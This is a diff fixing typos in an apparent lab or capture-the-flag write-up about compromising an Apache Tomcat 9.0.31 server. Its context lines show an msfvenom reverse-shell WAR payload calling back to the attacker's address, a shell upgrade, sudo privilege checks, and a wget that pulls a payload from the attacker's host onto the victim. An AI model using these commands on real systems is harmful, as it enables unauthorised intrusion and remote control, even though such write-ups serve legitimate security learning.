@@ -25,7 +25,7 @@ Then an nmap scan:
 
 ![nmap](https://imgur.com/fqEpNx9.png)
 
-A closer look at port 8080 on my broswer reveals a Apache Tomcat/9.0.31 
+A closer look at port 8080 on my browser reveals an Apache Tomcat/9.0.31 
 
 ![tomcat](https://imgur.com/e78J3dy.png)
 
@@ -39,7 +39,7 @@ The Web Application Manager is an opportunity to upload a reverse shell. I'll be
 
 [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
 
-The payload must be a war file, listening on port 4444 with my local adddress.
+The payload must be a war file, listening on port 4444 with my local address.
 
 <pre>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f war > fedai.war</pre>
 
@@ -61,7 +61,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'</pre>
 
 ### User
 
-Always check sudo priviliges to see how we can start escelating priviliges:
+Always check sudo privileges to see how we can start escalating privileges:
 
 <pre>sudo -l</pre>
    
@@ -79,7 +79,7 @@ Start the apache2 service:
 
 <pre>service apache2 start</pre>
 
-Go to the temp directory on the victims machine and transfer the payload over.
+Go to the temp directory on the victim's machine and transfer the payload over.
 
 <pre>cd /tmp
 wget http://192.168.56.101/fedai.jar</pre>
